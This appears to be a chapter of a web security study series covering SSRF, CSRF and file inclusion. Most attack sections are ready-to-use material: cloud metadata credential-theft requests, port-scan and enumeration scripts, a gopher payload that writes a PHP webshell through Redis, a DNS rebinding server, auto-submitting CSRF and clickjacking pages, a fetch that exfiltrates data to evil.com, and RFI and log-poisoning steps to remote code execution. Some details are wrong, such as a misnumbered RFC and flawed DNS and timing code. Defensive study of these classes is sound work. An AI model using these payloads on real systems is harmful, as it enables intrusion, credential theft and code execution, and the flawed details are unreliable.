# SSRF, CSRF, and LFI/RFI: Deep Technical Analysis

## 1. Server-Side Request Forgery (SSRF)

### 1.1 SSRF Evolution and Classification

SSRF has evolved from a niche vulnerability to a critical attack vector, particularly in cloud environments. The vulnerability class enables an attacker to induce the server to make HTTP requests to arbitrary destinations, bypassing network boundary protections.

**Basic SSRF** — Server makes a request to a URL supplied by the attacker:

```http
GET /api/fetch?url=https://example.com/image.jpg HTTP/1.1
Host: target.com

# Attack: Access internal services
GET /api/fetch?url=http://127.0.0.1:8080/admin HTTP/1.1
GET /api/fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
```

**Blind SSRF** — Server makes the request but doesn't return the response to the attacker:

```http
# Vulnerable endpoint that fetches URL for image preview
POST /api/preview HTTP/1.1
Content-Type: application/json

{"url": "http://169.254.169.254/latest/meta-data/"}
→ Response: {"status": "preview_generated"}  // No response body from target
```

**Semi-blind SSRF** — Attacker can infer information through timing, error messages, or side channels:

```python
# Timing-based enumeration: measure response time for each port
import requests
import time

for port in range(1, 65536):
    start = time.time()
    try:
        requests.get(f"http://target.com/api/fetch?url=http://192.168.1.1:{port}/", timeout=5)
    except:
        pass
    elapsed = time.time() - start
    if elapsed > 2.0:  # Port is open (longer response time)
        print(f"[+] Port {port} appears open (response time: {elapsed:.2f}s)")
```

### 1.2 Cloud Metadata SSRF

Cloud provider metadata services are the highest-impact SSRF targets because they expose credentials and configuration:

```bash
# AWS EC2 Instance Metadata Service (IMDSv1)
# Accessible at: http://169.254.169.254/latest/meta-data/

# Enumeration:
curl http://169.254.169.254/latest/meta-data/
# ami-id, hostname, iam/, instance-id, local-ipv4, local-hostname, ...

# IAM role credentials (most critical):
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# my-role

curl http://169.254.169.254/latest/meta-data/iam/security-credentials/my-role
# {
#   "Code": "Success",
#   "AccessKeyId": "ASIA...",
      "SecretAccessKey": "wJalrXUtnFEMI/...",
#   "Token": "IQoJb3JpZ2luX2VjE...",
#   "Expiration": "2024-01-15T12:00:00Z"
# }
# With these credentials, the attacker assumes the IAM role and inherits all its permissions

# User data (may contain startup scripts with secrets):
curl http://169.254.169.254/latest/user-data/
# #!/bin/bash
# export DB_PASSWORD="supersecret123"
# export AWS_ACCESS_KEY_ID="AKIA..."
# export AWS_SECRET_ACCESS_KEY="..."

# IMDSv2 (requires PUT request first for token):
curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
# Returns: AQAEAE... (token)
curl http://169.254.169.254/latest/meta-data/ -H "X-aws-ec2-metadata-token: AQAEAE..."
```

```bash
# Google Cloud Compute metadata
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
# project/, instance/, service-accounts/

# Service account token:
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# {"access_token": "ya29...", "expires_in": 3600, "token_type": "Bearer"}

# Custom metadata (often contains secrets):
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/attributes/secrets
```

```bash
# Azure Instance Metadata Service (IMDS)
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
# Comprehensive instance information including network configuration

# Managed identity token:
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
# {"access_token": "eyJ0eXAi...", "expires_on": "..."}
```

### 1.3 Internal Service Enumeration via SSRF

```python
# Systematic internal service enumeration
import requests
import concurrent.futures

internal_ranges = [
    # Kubernetes services (default ClusterIP range)
    ("http://10.0.0.1:80", "kubernetes-api"),
    ("http://10.0.0.1:443", "kubernetes-api-tls"),
    ("http://10.100.0.1:80", "kubernetes-dns"),
    
    # Common internal services
    ("http://127.0.0.1:3000", "grafana"),
    ("http://127.0.0.1:5601", "kibana"),
    ("http://127.0.0.1:9090", "prometheus"),
    ("http://127.0.0.1:8500", "consul"),
    ("http://127.0.0.1:8200", "vault"),
    ("http://127.0.0.1:2379", "etcd"),
    
    # Databases (testing common ports)
    ("http://127.0.0.1:5432", "postgresql"),
    ("http://127.0.0.1:3306", "mysql"),
    ("http://127.0.0.1:6379", "redis"),
    ("http://127.0.0.1:27017", "mongodb"),
    ("http://127.0.0.1:9200", "elasticsearch"),
    
    # Cloud metadata
    ("http://169.254.169.254/latest/meta-data/", "aws-metadata"),
    ("http://metadata.google.internal/", "gcp-metadata"),
]

# Mass enumeration via SSRF
target_url = "https://target.com/api/fetch?url={}"
for service_url, service_name in internal_ranges:
    try:
        resp = requests.get(target_url.format(service_url), timeout=3)
        if resp.status_code != 502:  # Not a gateway error
            print(f"[+] {service_name} ({service_url}): {resp.status_code} {resp.text[:200]}")
    except requests.Timeout:
        print(f"[!] {service_name} ({service_url}): timeout (possibly open)")
    except:
        pass
```

### 1.4 Protocol Smuggling via SSRF

SSRF endpoints that make arbitrary URL requests can be abused to interact with non-HTTP services by sending protocol-specific payloads:

```http
# SSRF to Redis: Write arbitrary data to Redis
# Redis protocol uses plain text commands
GET /api/fetch?url=dict://127.0.0.1:6379/INFO HTTP/1.1

# Redis command via gopher protocol:
GET /api/fetch?url=gopher://127.0.0.1:6379/_*3%0d%0a$8%0d%0aflushall%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$33%0d%0a<?php%20system($_GET[0]);%20?>%0d%0a*1%0d%0a$4%0d%0asave%0d%0a HTTP/1.1

# This writes a PHP webshell to /var/www/html/shell.php via Redis
```

```http
# SSRF to MySQL: Execute SQL queries
GET /api/fetch?url=gopher://127.0.0.1:3306/_...HTTP/1.1

# SSRF to SMTP: Send email
GET /api/fetch?url=gopher://127.0.0.1:25/_HELO%20attacker.com%0d%0AMAIL%20FROM%3Aattacker%40attacker.com%0d%0ARCPT%20TO%3Avictim%40target.com%0d%0ADATA%0d%0ASubject%3A%20Important%0d%0ATest%0d%0a.%0d%0aQUIT%0d%0a HTTP/1.1

# SSRF to internal HTTP services with POST data:
GET /api/fetch?url=gopher://127.0.0.1:8080/_POST%20/admin/users%20HTTP/1.1%0d%0aHost%3A%20internal%0d%0aContent-Type%3A%20application/json%0d%0aContent-Length%3A%2042%0d%0a%0d%0a%7B%22username%22%3A%22admin%22%2C%22role%22%3A%22superadmin%22%7D HTTP/1.1
```

### 1.5 DNS Rebinding

DNS rebinding exploits the time-of-check-time-of-use (TOCTOU) race between SSRF validation and request execution:

```
DNS Rebinding Attack Flow:

1. Attacker registers domain: evil.com
2. Attacker configures DNS with very short TTL (1 second):
   evil.com → 1.2.3.4 (public IP, passes SSRF filter)
3. Application validates URL against allowlist:
   URL: http://evil.com/admin
   DNS: evil.com → 1.2.3.4 (public IP) → ALLOWED ✓
4. Attacker immediately changes DNS:
   evil.com → 127.0.0.1 (localhost) 
5. Application makes the actual request:
   URL: http://evil.com/admin
   DNS: evil.com → 127.0.0.1 → REQUEST TO LOCALHOST!
```

```python
# DNS rebinding server implementation
from dnslib import DNSRecord, QTYPE
from dnslib.server import DNSServer

class RebindingResolver:
    def __init__(self):
        self.query_count = 0
    
    def resolve(self, request, handler):
        reply = request.reply()
        query_name = str(request.q.qname)
        
        self.query_count += 1
        if self.query_count % 2 == 1:
            # First query: return public IP (passes validation)
            reply.add_answer(DNSRecord(query_name, QTYPE.A, rdata="1.2.3.4", ttl=1))
        else:
            # Second query: return internal IP (actual target)
            reply.add_answer(DNSRecord(query_name, QTYPE.A, rdata="127.0.0.1", ttl=1))
        
        return reply

# More sophisticated: per-client state tracking
# First query from any IP: returns public IP
# Subsequent queries: returns internal IP
```

### 1.6 Time-Based Blind SSRF

When SSRF responses are not returned directly and the target service doesn't produce observable side effects, timing can be used to infer information:

```python
import requests
import time

def blind_ssrf_port_scan(base_url, target_ip, ports):
    """Port scan via time-based blind SSRF."""
    results = {}
    for port in ports:
        url = f"{base_url}?url=http://{target_ip}:{port}/"
        
        start = time.time()
        try:
            resp = requests.get(url, timeout=10)
        except requests.Timeout:
            pass
        elapsed = time.time() - start
        
        # Open ports typically respond faster (connection refused is instant)
        # vs. closed ports that timeout
        if elapsed > 0.5 and elapsed < 8:  # Likely open port
            results[port] = "open"
        elif elapsed < 0.1:  # Connection refused (fast response)
            results[port] = "closed"
        else:  # Timeout (filtered)
            results[port] = "filtered"
    
    return results

# Character-by-character data extraction via blind SSRF
def blind_ssrf_extract(base_url, target_url, position, char):
    """Extract data character by character using timing differences."""
    # If the target service responds differently based on a condition,
    # we can use timing to extract data
    
    # Example: MySQL time-based blind via SSRF
    payload_url = f"http://internal-db:3306/?query=SELECT IF(SUBSTRING(secret,{position},1)='{char}',SLEEP(5),0)"
    
    start = time.time()
    requests.get(f"{base_url}?url={payload_url}", timeout=15)
    elapsed = time.time() - start
    
    return elapsed > 5  # True = character matches
```

### 1.7 SSRF via PDF Generators

Many web applications generate PDFs from user-supplied HTML content. If the PDF generator fetches external resources, this creates an SSRF vector:

```html
<!-- Malicious HTML submitted to PDF generator -->
<!-- Image SSRF -->
<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/role" />

<!-- CSS-based SSRF -->
<style>
  @import url("http://internal-service:8080/admin/config");
  body { background: url("http://169.254.169.254/latest/meta-data/"); }
</style>

<!-- SVG-based SSRF (embedded in HTML) -->
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject>
    <img src="http://internal-service:8080/secret" />
  </foreignObject>
</svg>

<!-- Iframe-based SSRF -->
<iframe src="http://169.254.169.254/latest/meta-data/" width="0" height="0"></iframe>

<!-- JavaScript in PDF (if engine executes JS) -->
<script>
  var xhr = new XMLHttpRequest();
  xhr.open("GET", "http://169.254.169.254/latest/meta-data/", false);
  xhr.send();
  document.write(xhr.responseText);
</script>
```

### 1.8 URL Parser Inconsistencies

Different URL parsers handle the same URL differently, creating exploitable gaps:

```
URL: http://evil.com@target.com/

Parser A (server-side validation): sees "target.com" → ALLOWED
Parser B (HTTP client making request): sends credentials to "evil.com" → BLOCKED

But if the parsers disagree in the opposite direction:
URL: http://target.com@evil.com/

Parser A (validation): sees "target.com" → ALLOWED (interprets as target.com with auth)
Parser B (request): connects to "evil.com" → SSRF to arbitrary host

Other parser inconsistency examples:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

URL                              Parser A sees    Parser B sees
http://127.0.0.1                 127.0.0.1        127.0.0.1
http://0x7f000001                127.0.0.1        0x7f000001 (different!)
http://0177.0.0.1                127.0.0.1        0177.0.0.1 (different!)
http://2130706433                127.0.0.1        2130706433 (different!)
http://0                         0.0.0.0          0 (different!)
http://[::1]                     ::1 (localhost)  [::1] (literal)
http://127.1                     127.0.0.1        127.1 (different!)
http://127.0.1                   127.0.0.1        127.0.1 (different!)

Fragment handling:
http://evil.com#@target.com      evil.com         target.com (fragment)
http://target.com#evil.com        target.com       target.com (fragment)

Path confusion:
http://target.com/redirect?url=http://evil.com
http://target.com@evil.com/path
http://evil.com%00.target.com      evil.com (null byte truncation)

Backslash handling:
http://evil.com\target.com        evil.com (some parsers) or target.com (others)
```

### 1.9 IPv6 SSRF

```http
# IPv6 representations of localhost
http://[::1]                    # IPv6 localhost
http://[0:0:0:0:0:0:0:1]       # IPv6 localhost (full form)
http://[::ffff:127.0.0.1]      # IPv4-mapped IPv6 localhost
http://[::ffff:7f00:1]         # IPv4-mapped hex localhost

# IPv6 SSRF to reach internal IPv6 services
http://[fd00::1]:8080/          # Unique local address
http://[fe80::1]:8080/          # Link-local address

# IPv6 address with zone ID (for link-local)
http://[fe80::1%25eth0]/        # Zone ID for interface specification

# IPv6 full address with embedded information
http://[0:0:0:0:0:ffff:169.254.169.254]/   # AWS metadata via IPv6-mapped IPv4
```

---

## 2. Cross-Site Request Forgery (CSRF)

### 2.1 CSRF Fundamentals

CSRF exploits the browser's automatic inclusion of credentials (cookies, HTTP auth, client certificates) with cross-origin requests. A malicious site can cause the victim's browser to make authenticated requests to a target site:

```html
<!-- CSRF attack: Transfer funds from victim's account -->
<!-- Hosted on attacker.com -->
<html>
<body>
  <h1>Click to win a prize!</h1>
  <form id="csrf-form" action="https://bank.target.com/api/transfer" method="POST">
    <input type="hidden" name="to" value="attacker_account" />
    <input type="hidden" name="amount" value="10000" />
    <input type="hidden" name="currency" value="USD" />
  </form>
  <script>document.getElementById('csrf-form').submit();</script>
</body>
</html>

<!-- Invisible iframe-based CSRF (no user interaction required) -->
<html>
<body>
  <iframe style="display:none" name="csrf-frame"></iframe>
  <form id="csrf-form" action="https://bank.target.com/api/transfer" method="POST" target="csrf-frame">
    <input type="hidden" name="to" value="attacker_account" />
    <input type="hidden" name="amount" value="10000" />
  </form>
  <script>document.getElementById('csrf-form').submit();</script>
</body>
</html>
```

### 2.2 SameSite Cookie Changes

The `SameSite` cookie attribute is now the primary defense against CSRF. Modern browsers default to `SameSite=Lax`:

```http
// SameSite cookie attribute values:

// Strict: Cookie never sent in cross-site requests
Set-Cookie: session=abc123; SameSite=Strict
// Side effect: cookie not sent even when following a link from another site
// User clicks link from email → bank.com doesn't receive session cookie → logged out

// Lax: Cookie sent for top-level navigations (GET), but not for cross-site POST/iframe/AJAX
Set-Cookie: session=abc123; SameSite=Lax
// Balance between security and usability
// Protects against POST-based CSRF while allowing link-following

// None: Cookie sent in all cross-site requests (requires Secure)
Set-Cookie: session=abc123; SameSite=None; Secure
// Required for third-party integrations (OAuth, SAML, embedded content)
// Effectively disables SameSite protection
```

SameSite bypass conditions:

```
SameSite=Strict  → No known bypasses (most restrictive)
SameSite=Lax     → Bypass conditions:
  1. CSRF via top-level navigation with GET method
     The cookie IS sent for top-level GET navigations
     If state-changing operations use GET, they're vulnerable
  
  2. Window of vulnerability (2-minute Lax+POST):
     Chrome allows cookies in cross-site POSTs within 2 minutes of cookie creation
     This window exists for SAML/OIDC flows
     Attack: Force cookie creation, then CSRF within 2 minutes
  
  3. Same-site subdomain:
     If attacker controls subdomain.target.com, requests from
     subdomain.target.com to target.com are same-site
     (SameSite checks eTLD+1, not exact origin)

SameSite=None    → No protection (requires Secure + HTTPS)
```

### 2.3 CORS Misconfiguration as CSRF Vector

```http
# CORS misconfiguration enables cross-origin CSRF with response reading
# Normal CSRF: attacker can send request but cannot read response
# CORS misconfiguration: attacker can BOTH send and read

# Vulnerable CORS configuration:
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true

// JavaScript on evil.com can now:
fetch('https://target.com/api/user/profile', {
    credentials: 'include'  // Sends cookies
})
.then(response => response.json())
.then(data => {
    // Exfiltrate the response
    fetch('https://evil.com/exfil', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});
```

### 2.4 Clickjacking Variants

**Classic clickjacking (UI redressing)**: An attacker loads the target page in a transparent iframe, positions it over a decoy button, and tricks the user into clicking:

```html
<!-- Classic clickjacking -->
<html>
<head>
  <style>
    .transparent-iframe {
      position: absolute;
      top: 0;
      left: 0;
      width: 500px;
      height: 300px;
      opacity: 0.01;  /* Nearly invisible */
      z-index: 10;
    }
    .decoy-button {
      position: absolute;
      top: 120px;
      left: 80px;
      z-index: 5;
    }
  </style>
</head>
<body>
  <h1>Click to claim your reward!</h1>
  <button class="decoy-button" style="font-size:20px;padding:10px 20px;">Claim Reward</button>
  <iframe class="transparent-iframe" src="https://target.com/account/delete"></iframe>
</body>
</html>
```

**Cursorjacking**: Decoupling the visual cursor position from the actual pointer location:

```html
<!-- Cursorjacking attack -->
<html>
<head>
  <style>
    body { cursor: none; }  /* Hide real cursor */
    .fake-cursor {
      position: absolute;
      pointer-events: none;
      z-index: 9999;
    }
  </style>
</head>
<body>
  <!-- Decoy content with fake cursor positioned above visible button -->
  <!-- Actual target (iframe) is positioned elsewhere -->
  <img class="fake-cursor" id="cursor" src="cursor.png" />
  <iframe style="position:absolute; top:300px; left:100px; opacity:0.01" 
          src="https://target.com/admin/delete-all"></iframe>
  <script>
    document.addEventListener('mousemove', (e) => {
      // Offset real cursor by 200px down and left
      const fakeCursor = document.getElementById('cursor');
      fakeCursor.style.left = (e.clientX - 200) + 'px';
      fakeCursor.style.top = (e.clientY - 100) + 'px';
    });
  </script>
</body>
</html>
```

**Drag-and-drop clickjacking**: Tricking users into dragging sensitive content into an attacker-controlled iframe:

```html
<!-- Drag-and-drop data exfiltration -->
<html>
<body>
  <div id="decoy" draggable="true" style="position:absolute; top:100px;">
    Drag this image to the drop zone
    <img src="interesting-image.png" />
  </div>
  
  <iframe style="opacity:0.01; position:absolute; top:100px; left:200px;" 
          src="https://target.com/account/settings"></iframe>
  
  <script>
    // The iframe's input field (e.g., email change form) is positioned under
    // the decoy draggable, causing user to drop content into the target's form
  </script>
</body>
</html>
```

---

## 3. Local and Remote File Inclusion

### 3.1 Path Traversal

Path traversal (directory traversal) allows accessing files outside the intended directory:

```http
# Basic path traversal
GET /api/files?path=../../../../etc/passwd HTTP/1.1

# URL-encoded traversal
GET /api/files?path=..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1

# Double URL encoding (server decodes once, application decodes again)
GET /api/files?path=..%252F..%252F..%252F..%252Fetc%252Fpasswd HTTP/1.1

# Null byte injection (PHP < 5.3.4)
GET /api/files?path=../../../../etc/passwd%00.jpg HTTP/1.1
# Server appends .jpg: "../../../../etc/passwd\0.jpg"
# PHP treats \0 as string terminator: opens "/etc/passwd"

# Unicode normalization
GET /api/files?path=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd HTTP/1.1
# %c0%af decodes to / after Unicode normalization

# Windows-specific
GET /api/files?path=..\..\..\..\windows\system32\config\sam HTTP/1.1
GET /api/files?path=..%5c..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam HTTP/1.1
```

### 3.2 Path Traversal Filter Bypass

```python
# Common filter bypasses for path traversal

# 1. Sequential traversal removal bypass
# Filter removes "../" once: "../../../etc/passwd" → "./etc/passwd"
# Bypass: "....//....//etc/passwd"
# After "../" removal: ".." + "//" + ".." + "//" + "etc/passwd"
# Path normalization: "../../etc/passwd"

# 2. Encoding bypasses
# Double encoding: %252F → %2F → /
# Path: ..%252F..%252Fetc%252Fpasswd
# URL-encoded: ..%2F..%2Fetc%2Fpasswd → ../../etc/passwd

# 3. Case sensitivity (Windows)
# ..\..\etc\passwd (backslash path separator)
# ..\..\ETC\PASSWD (Windows paths are case-insensitive)

# 4. Alternative path representations
# /etc/passwd = /etc/./passwd = /etc//passwd = /etc/passwd.
# On Linux: /proc/self/root/etc/passwd (symlink to filesystem root)

# 5. Symlink-based traversal
# ln -s / target_symlink
# Accessing target_symlink/etc/passwd reads /etc/passwd

# 6. Zip slip (path traversal in archive extraction)
# Archive contains file with path: ../../../../../../etc/cron.d/malicious
# When extracted, writes to /etc/cron.d/malicious instead of target directory
```

### 3.3 PHP Wrappers for LFI

PHP provides protocol wrappers that can be used to escalate LFI to RCE:

```http
# php://filter — Read PHP source code (base64 encoded)
GET /page=php://filter/convert.base64-encode/resource=index.php HTTP/1.1
# Returns base64-encoded index.php source code

# Read specific file contents
GET /page=php://filter/convert.base64-encode/resource=/etc/passwd HTTP/1.1

# php://filter with various encodings
GET /page=php://filter/read=string.rot13/resource=index.php HTTP/1.1
GET /page=php://filter/read=string.toupper/resource=index.php HTTP/1.1
GET /page=php://filter/convert.iconv.utf-16.utf-8/resource=index.php HTTP/1.1

# php://input — Execute raw POST data as PHP code
POST /page=php://input HTTP/1.1
Content-Type: application/x-www-form-urlencoded

<?php system('id'); ?>

# data:// — Inject PHP code via data URI
GET /page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg== HTTP/1.1
# Base64 decodes to: <?php system('id'); ?>

GET /page=data://text/plain,<?php system('id'); ?> HTTP/1.1
# Direct injection (requires allow_url_include=On)

# expect:// — Execute commands (requires expect extension)
GET /page=expect://id HTTP/1.1

# phar:// — Execute PHP archive metadata
GET /page=phar:///tmp/malicious.phar HTTP/1.1
# phar metadata is deserialized: PHP Object Injection

# zip:// — Include files from ZIP archives
GET /page=zip:///tmp/shell.zip%23shell.php HTTP/1.1
```

### 3.4 Log Poisoning

Log poisoning turns an LFI vulnerability into RCE by injecting PHP code into server log files:

```http
# Step 1: Inject PHP code into access log via User-Agent header
GET /<?php system($_GET['cmd']); ?> HTTP/1.1
Host: target.com
User-Agent: <?php system($_GET['cmd']); ?>

# Step 2: Include the log file via LFI
GET /page=/var/log/apache2/access.log&cmd=id HTTP/1.1

# Common log file locations:
# Apache: /var/log/apache2/access.log, /var/log/httpd/access_log
# Nginx: /var/log/nginx/access.log
# PHP: /var/log/php_errors.log
# SSH: /var/log/auth.log (inject via SSH username)
# MySQL: /var/log/mysql/error.log (inject via SQL query)
```

```http
# Step 1: Inject PHP code into SSH auth log (attempt login with PHP username)
ssh '<?php system($_GET["cmd"]); ?>'@target.com

# Step 2: Include SSH auth log
GET /page=/var/log/auth.log&cmd=id HTTP/1.1

# Step 1: Inject PHP code via WebSocket handshake
GET /<?php system($_GET['cmd']); ?> HTTP/1.1
Upgrade: websocket
Connection: Upgrade

# Step 2: Include the log
GET /page=/var/log/nginx/access.log&cmd=id HTTP/1.1
```

### 3.5 Remote File Inclusion (RFI) to RCE

```http
# RFI allows including files from remote servers
GET /page=http://evil.com/shell.php HTTP/1.1

# If allow_url_include=On in php.ini:
# The server fetches and executes http://evil.com/shell.php

# shell.php on attacker's server:
<?php system($_GET['cmd']); ?>

# Full exploit:
GET /page=http://evil.com/shell.php&cmd=id HTTP/1.1

# RFI via SMB (Windows, when allow_url_include=On)
GET /page=\\evil.com\share\shell.php HTTP/1.1

# SMB share setup on attacker side:
# impacket-smbserver share /tmp/smbshare/
```

### 3.6 LFI to RCE via /proc

```http
# /proc/self/environ — Process environment variables (may contain injected code)
# Step 1: Inject PHP code into User-Agent header
GET /page=/proc/self/environ HTTP/1.1
User-Agent: <?php system($_GET['cmd']); ?>

# /proc/self/fd — File descriptors (may link to log files)
GET /page=/proc/self/fd/0 HTTP/1.1  # stdin
GET /page=/proc/self/fd/1 HTTP/1.1  # stdout
GET /page=/proc/self/fd/2 HTTP/1.1  # stderr
GET /page=/proc/self/fd/3 HTTP/1.1  # access log (often fd 3-10)
GET /page=/proc/self/fd/4 HTTP/1.1
# ... try descriptors 0-50

# /proc/self/cmdline — Process command line
GET /page=/proc/self/cmdline HTTP/1.1

# /proc/self/maps — Process memory map (for memory-based RCE)
GET /page=/proc/self/maps HTTP/1.1

# /tmp/phpXXXXXX — PHP session files
# Step 1: Set PHP code in session
GET /page=set_session.php?data=<?php system($_GET['cmd']); ?> HTTP/1.1
# Step 2: Find session file
GET /page=/tmp/sess_XXXXXXXXXXXXXXXX HTTP/1.1&cmd=id
```

---

## Cross-Reference Guide

| Topic | Cross-Reference |
|-------|-----------------|
| Cloud SSRF exploitation | `05a_web_exploitation_chains.md` (Capital One) |
| WAF bypass for SSRF | `05b_waf_bypass_techniques.md` |
| CORS misconfiguration | `01a_web_architecture_attack_surface.md` |
| OAuth redirect URI manipulation | `02b_authentication_authorization.md` |
| API SSRF vectors | `03b_api_security.md` |
| Client-side security | `04a_client_side_security.md` |
| Testing methodology | `06a_web_security_testing.md` |
| Hardening techniques | `06b_web_hardening_defense.md` |
| Chromium site isolation | `../Chromium_Architecture_and_Vulnerability/docs/09_site_isolation_architecture.md` |
| Cloud metadata SSRF | `../cloud_security/docs/` |

---

*SSRF, CSRF, and LFI/RFI represent three of the most versatile vulnerability classes in modern web applications. SSRF illuminates the blurred boundary between internal and external networks, CSRF exploits the browser's trust model, and LFI/RFI demonstrate how file system access can be escalated to code execution. Each requires distinct defensive strategies, but all share a common theme: implicit trust in user-supplied input.*

---

## References

1. OWASP Foundation. "Server-Side Request Forgery." https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
2. Orange Tsai. "A New Attack Surface on SSRF." Black Hat USA, 2019. https://blog.orange.tw/
3. SSRF Bible. "SSRF Payload List." https://github.com/swisskyrepo/PayloadsAllTheThings
4. OWASP Foundation. "Cross-Site Request Forgery (CSRF)." https://owasp.org/www-community/attacks/csrf
5. OWASP Foundation. "CSRF Prevention Cheat Sheet." https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
6. RFC 7049. "SameSite Cookie Attribute." https://www.rfc-editor.org/rfc/rfc6265 (Section 5.3.7)
7. Zeller, M. "Cloud Metadata SSRF." https://www.whitehatsec.com/blog/using-cloud-metadata-services-in-ssrf/
8. AWS Documentation. "Instance Metadata Service v2 (IMDSv2)." https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html
9. PortSwigger Ltd. "SSRF Labs." https://portswigger.net/web-security/ssrf
10. PortSwigger Ltd. "CSRF Labs." https://portswigger.net/web-security/csrf
11. CVE-2019-11510. "Pulse Secure VPN Arbitrary File Read." NVD. https://nvd.nist.gov/vuln/detail/CVE-2019-11510
12. SSRFmap. "Automated SSRF Exploitation." https://github.com/swisskyrepo/SSRFmap